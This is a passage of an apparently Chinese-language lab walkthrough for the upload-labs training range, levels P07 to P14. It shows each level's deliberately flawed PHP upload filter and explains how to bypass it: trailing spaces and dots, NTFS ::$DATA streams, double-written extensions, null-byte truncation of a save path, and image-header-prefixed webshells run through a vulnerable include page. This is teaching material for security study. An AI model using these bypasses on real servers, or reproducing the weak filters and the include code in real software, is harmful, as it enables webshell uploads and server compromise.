class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题和之前的过滤并没有把首尾去空，可以利用空格绕过；</p><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>在匹配的时候，后缀字符串后面有一个空格不会被匹配到，但是传上去之后Windows会自动删除末尾的空格；</p><h2 id="P08"><a href="#P08" class="headerlink" title="P08"></a>P08</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题并没有删除末尾点这一步；</p><h3 id="加点绕过"><a href="#加点绕过" class="headerlink" title="加点绕过"></a>加点绕过</h3><p>如之前所说，在windows上后缀名之后的点和空格都会被删的原理；</p><h2 id="P09"><a href="#P09" class="headerlink" title="P09"></a>P09</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次它的过滤比起之前的少了去除字符串::$DATA，那么这个东西是如何利用的呢？</p><h3 id="额外数据流"><a href="#额外数据流" class="headerlink" title="额外数据流"></a>额外数据流</h3><p>在<strong>windows</strong>操作系统中，文件名后面跟着::$DATA，表示一个文件附加数据流，数据流是一种用于在文件内部存储额外数据的机制；</p><p>正常情况下，文件只有一个默认数据流，通过文件名访问，但同时Windows NT文件系统支持在文件内部创建额外的数据流，存储其他信息用；</p><p>这些额外的数据流通过在文件后面添加::$DATA来访问；</p><p>写入方法：</p><p>利用重定向实现写入额外数据流；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deadbeaf&quot;</span> &gt;&gt; file.png:Hack</span><br><span class="line"><span class="built_in">type</span> file.php &gt;&gt; file.png:Hack</span><br></pre></td></tr></table></figure><p>上述后面的语句表示file.png文件的一个叫做Hack的额外数据流；</p><p>echo是将内容写入，type是将一个文件的内容写入；</p><p>查看方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad file.png:Hack</span><br></pre></td></tr></table></figure><p>此时会用记事本打开额外数据流的内容并显示；</p><h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h3><p>在php中，不会验证数据流后缀，如数据流名字为a.php，它只是一个数据流而不是一个文件，所以不会验证.php；</p><p>在上面也说了，一个文件后面跟着::$DATA就是一个数据流；</p><p>而windows中，文件名不允许冒号的存在，所以在上传时，改名文件后面跟着::$DATA，让检验部分认为这上传的是一个数据流而不是文件，从而绕过检测，在到达上传文件夹后，因windows的文件命名规则，将会删除冒号后面的东西变回文件，这就是绕过过程；</p><h2 id="P10"><a href="#P10" class="headerlink" title="P10"></a>P10</h2><p>与P05的另类绕过方式一样；</p><h2 id="P11"><a href="#P11" class="headerlink" title="P11"></a>P11</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题并不是用的in_array函数，而是str_ireplace函数，有什么区别呢？</p><p>前者会使用正则匹配整句话，而后者不去匹配整句，只会找这串字符（php）然后消除，即便后面加点加空格也会被消除，大写同理；</p><p>看起来不好绕了，因为特殊写法失效了，但其实这道题是最好绕的，sql注入里学的最有意思的便是双写绕过了；</p><p>因为只判断一次，所以直接后缀起名 pphphp ,匹配中中间的php使之剔除，留下php绕过；</p><h2 id="P12"><a href="#P12" class="headerlink" title="P12"></a>P12</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题与之前不同的是，使用了白名单机制；</p><p>可以知道php文件上传时，文件先是放于临时路径，之后转移到实际文件内，路径上的才是实际上的文件，之前改的文件名及其后缀只是包头内的一个字符串字段；</p><p>这道题的路径是可以被控制的，因为可以用Get传参；</p><p>此时可以用空字符截断，本身是Get部分加上后面的文件名和后缀内容组成一个文件路径，但可以在get部分直接写上一个完整文件路径，然后用空字符截断后面连接的部分达成绕过jpg的同时上传的文件类型是php；</p><p>在上传时，只需要设置参数即可成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?save_path=../upload/file.php%00</span><br></pre></td></tr></table></figure><h2 id="P13"><a href="#P13" class="headerlink" title="P13"></a>P13</h2><p>这道题和P12类似，get请求变为post请求，所以在后面添加0x00的hex编码即可；</p><h2 id="P14"><a href="#P14" class="headerlink" title="P14"></a>P14</h2><h3 id="图片字节标识"><a href="#图片字节标识" class="headerlink" title="图片字节标识"></a>图片字节标识</h3><p>魔术码</p><p>JPEG/JFIF  0xFF 0xD8</p><p>PNG        0x89 0x50</p><p>GIF        0x47 0x49</p><p>BMP        0x42 0x4D</p><p>TIFF       可变动，但也是前两个字节；</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题在检测上传文件的标识符，也就是前两个字节；</p><p>那么绕过思路则是在写好的一句话木马前面添加标识符进行绕过；</p><p>但这样还不够，服务器会把它按照图片解析，需要利用 <strong>文件包含漏洞</strong> 运行图片🐎中的木马；</p><h3 id="文件包含前瞻"><a href="#文件包含前瞻" class="headerlink" title="文件包含前瞻"></a>文件包含前瞻</h3><p>php设计之初为了使资源利用率更高效，设计了include这么一个东西；</p><p>当一个文件要引用一个另文件时，include进来就能直接使得这个<strong>文件调用</strong>一次；</p><p>当操控者可以控制include后面跟着的文件路径时，漏洞就发生了，因为在包含之后的文件会<strong>以php解析的形式执行</strong>，当图片内有php木马时，include就导致了木马的执行；</p><p>在upload文件夹的上层，靶场自带了一个include.php文件，用来形成文件包含漏洞的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* 本页面存在文件包含漏洞，用于测试图片马是否能正常运行！ */</span> </span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 